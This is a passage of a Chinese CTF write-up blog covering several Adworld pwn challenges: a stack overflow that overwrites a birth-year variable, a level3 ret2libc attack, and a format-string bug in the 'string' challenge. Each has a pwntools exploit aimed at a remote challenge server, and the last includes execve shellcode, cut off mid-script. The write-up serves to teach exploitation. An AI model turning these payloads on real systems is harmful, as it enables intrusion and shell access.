&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You Cannot Born In 1926!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"What's Your Name?"</span>);</span><br><span class="line">    gets((__int64)&amp;v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You Are Born In %d\n"</span>, v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1926</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Shall Have Flag."</span>);</span><br><span class="line">      system(<span class="string">"cat flag"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Are Naive."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You Speed One Second Here."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到了 <strong>gets((__int64)&amp;v4);</strong> ，典型的溢出，只要覆盖v5为1926(0x786)就行了</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>计算出v5的偏移，覆盖v5为0x786就行了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure>

<p>0x20-0x18=0x2,偏移为8个字节，填充8个字节的垃圾数据，然后将后四位覆盖为0x786就行了。</p>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'37142'</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(<span class="number">0x0786</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">p.sendline(<span class="string">"AAAA"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What's Your Name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><h2 id="查看文件信息-3"><a href="#查看文件信息-3" class="headerlink" title="查看文件信息"></a>查看文件信息</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thriumph@ubuntu:~/pwn/gfsj/level3$ file level3</span><br><span class="line">level3: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">44</span>a438e03b4d2c1abead90f748a4b5500b7a04c7, <span class="keyword">not</span> stripped</span><br><span class="line">Thriumph@ubuntu:~/pwn/gfsj/level3$ checksec level3</span><br><span class="line">[*] '/home/Thriumph/pwn/gfsj/level3/level3'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>开启了NX保护</p>
<h2 id="查看main函数"><a href="#查看main函数" class="headerlink" title="查看main函数"></a>查看main函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World!\n"</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没问题</p>
<h2 id="查看vulnerable-function-函数"><a href="#查看vulnerable-function-函数" class="headerlink" title="查看vulnerable_function()函数"></a>查看vulnerable_function()函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有一个缓冲区buf，在read函数中进行了调用，可以进行溢出。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>若无libc<br>1.通过vulerable_function()的read()构造ROP得到PLT表中write()的位置<br>2.通过write()得到write()在程序中的真实地址<br>3.使用LibcSearcher得到libc版本<br>4.在对应的libc版本中查找write()、system()、/bin/sh的真实地址<br>5.使用write()的程序地址和libc地址计算出偏移量<br>6.在system()、/bin/sh的真实地址上加上偏移量再通过vulerable_function()执行得到shell</p>
<p>但是这个题单独给出了libc，没有现成的system函数，没有”/bin/sh”，只有read()和write()函数，是ret2libc。<br>要从libc中动态加载system函数，PIE没有开启，那么在libc中函数的offset就是固定的，只要确认了libc的base address，然后计算出system函数的offset，就可以定位到system函数的真实地址，实现调用。</p>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>ibc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。<br>1.首先利用write()函数计算出write()函数的真实地址。<br>2.利用相对offset计算出system和”/bin/sh”的真实地址。</p>
<p>在vulnerable_function()中，先调用了write()函数，然后调用read()函数。write()函数返回到vulnerable_function()后，再进行read()函数调用，这样就可以进行二次攻击。</p>
<p>第一次攻击我们利用栈溢出将write()函数在got表中的真实地址leak出来，然后减去libc中的offset，就可以得到libc的base address。</p>
<p>第二次攻击重新进入main函数，再次通过栈溢出，利用system函数进行getshell。</p>
<p>两次攻击情况</p>
<table>
<thead>
<tr>
<th align="center">First stack</th>
<th align="center">second stack</th>
</tr>
</thead>
<tbody><tr>
<td align="center">‘A’ * 0x88</td>
<td align="center">‘A’ * 0x88</td>
</tr>
<tr>
<td align="center">EBP</td>
<td align="center">EBP</td>
</tr>
<tr>
<td align="center">write@plt</td>
<td align="center">sys_addr</td>
</tr>
<tr>
<td align="center">main_addr</td>
<td align="center">0xdeadbeef</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">bin_sh_addr</td>
</tr>
<tr>
<td align="center">write@got</td>
<td align="center">XXXX</td>
</tr>
<tr>
<td align="center">0xdeadbeef</td>
<td align="center">XXXX</td>
</tr>
</tbody></table>
<p>第一次攻击获得libc的基地址<br>payload = ‘A’ * 0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)</p>
<p>第二次攻击获得其他地址<br>payload0 = ‘A’ * 0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</p>
<table>
<thead>
<tr>
<th align="center">Address</th>
<th align="center">Calculate</th>
</tr>
</thead>
<tbody><tr>
<td align="center">libc_addr</td>
<td align="center">write_got_addr - libc.symbols[‘write’]</td>
</tr>
<tr>
<td align="center">sys_addr</td>
<td align="center">libc_addr + libc.symbols[‘system’]</td>
</tr>
<tr>
<td align="center">bin_sh_addr</td>
<td align="center">libc_addr + 0x15902b</td>
</tr>
</tbody></table>
<h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p    = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'32414'</span>)</span><br><span class="line">elf  = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取write()在程序内GOT地址和vulnerable_function()调用地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">valf_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取write()在程序内真实地址</span></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">0x88</span> +  p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(valf_addr) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak write's addr in got</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">"write  addr - "</span>+hex(write_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#载入libc并得到/bin/sh、write()、system()、exit()在libc中地址</span></span><br><span class="line">write_libc  = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_libc = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">exit_libc   = libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算偏移量</span></span><br><span class="line">libc_base   = write_addr - write_libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system()、/bin/sh、exit()在内存中的真实地址</span></span><br><span class="line">system_addr = libc_base  + system_libc</span><br><span class="line">bin_sh_addr = libc_base  + bin_sh_libc</span><br><span class="line">exit_addr   = libc_base  + exit_libc</span><br><span class="line">print(<span class="string">"system addr - "</span>+hex(system_addr))</span><br><span class="line">print(<span class="string">"bin_sh addr - "</span>+hex(bin_sh_addr))</span><br><span class="line">print(<span class="string">"exit   addr - "</span>+hex(exit_addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x88</span> + <span class="string">'A'</span>*<span class="number">0x4</span> + p32(system_addr) + p32(exit_addr) + p32(bin_sh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="string"><a href="#string" class="headerlink" title="string"></a>string</h1><h2 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h2><p><img src="/攻防世界pwn新手区/7.png" alt><br>程序是64位的，基于x86构架的，开启了canary保护和堆栈不可执行保护</p>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><strong>main()函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v4 = (__int64)v3;</span><br><span class="line">  *v3 = <span class="number">68</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"we will tell you two secret ..."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[0] is %x\n"</span>, v4, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"secret[1] is %x\n"</span>, v4 + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"do not tell anyone "</span>);</span><br><span class="line">  sub_400D72(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The End.....Really?"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会调用sub_400D72(v4)，其中v4=( _ int64) v3。大致流程就是随机生成一个v3,v3[0]=68,v3[1]=85,v3[0]的地址是a2</p>
<p><strong>sub_400D72函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400D72</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What should your character's name be:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Creating a new player."</span>);</span><br><span class="line">    sub_400A7D(<span class="string">"Creating a new player."</span>);</span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hei! What's up!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入的长度要小于12。<br>这里面还分别调用了三个函数，sub_400A7D，sub_400BB9和sub_400CA6，分别进去查看</p>
<p><strong>sub_400A7D函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400A7D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">" This is a famous but quite unusual inn. The air is fresh and the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"marble-tiled ground is clean. Few rowdy guests can be seen, and the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"furniture looks undamaged by brawls, which are very common in other pubs"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"all around the world. The decoration looks extremely valuable and would fit"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"into a palace, but in this city it's quite ordinary. In the middle of the"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"room are velvet covered chairs and benches, which surround large oaken"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tables. A large sign is fixed to the northern wall behind a wooden bar. In"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"one corner you notice a fireplace."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There are two obvious exits: east, up."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But strange thing is ,no one there."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"So, where you will go?east or up?:"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) || !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hei! I'm secious!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"So, where you will go?:"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">"east"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"up"</span>) )</span><br><span class="line">      sub_4009DD(&amp;s1, <span class="string">"up"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"YOU KNOW WHAT YOU DO?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入east或up，输入up会进入sub_4009DD，输出puts(“YOU ARE DEAD”)。所以输入要和east相等</p>
<p><strong>sub_400BB9()函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You travel a short distance east.That's odd, anyone disappear suddenly"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">", what happend?! You just travel , and find another hole"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You recall, a big black hole will suckk you into it! Know what should you do?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"go into there(1), or leave(0)?:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"A voice heard in your mind"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"'Give me an address'"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%ld"</span>, &amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And, you wish is:"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%s"</span>, &amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your wish is"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I hear it, I hear it...."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到了<code>printf(&amp;format, &amp;format);</code>这是一个格式化字符串的漏洞</p>
<p><strong>sub_400CA6函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400CA6</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Dragon say: HaHa! you were supposed to have a normal"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RPG game, but I have changed it! you have no weapon and "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"skill! you could not defeat me !"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"That's sound terrible! you meet final boss!but you level is ONE!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wizard: I will help you! USE YOU SPELL"</span>);</span><br><span class="line">    v1 = mmap(<span class="number">0L</span>L, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">void</span> *))v1)(<span class="number">0L</span>L, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code>a1[0]=a1[1]，把v1强制转化成一个函数指针并调用这个函数。</p>
<p><img src="/攻防世界pwn新手区/8.png" alt><br>之后可以看到调用了read函数</p>
<h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>通过printf任意地址写入使 * a1 == a1[1]，也就是使v3[0]=v3[1]=85。需要知道v3[0]的地址，在main函数发现其实secret[0]即v3[0]的地址，所以就可以利用printf任意地址写修改v3[0]处的值了。在64位程序下，前6个参数从左到右依次放到RDI、RSI、RDX、RCX、R8、R9中，所以从第七个开始，我们就可以修改栈中的数据为85</p>
<p>也可以通过%x查看偏移，偏移为7<br><img src="/攻防世界pwn新手区/9.png" alt></p>
<p>所以构造payload为<code>&quot;%85d%7$n&quot;</code></p>
<h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'44407'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line">addr = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">payload = asm(shellcraft.amd64.linux.sh(), arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#payload2 = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">p.recvuntil(<span class="string">'What should your character\'s name be:'</span>)</span><br><span 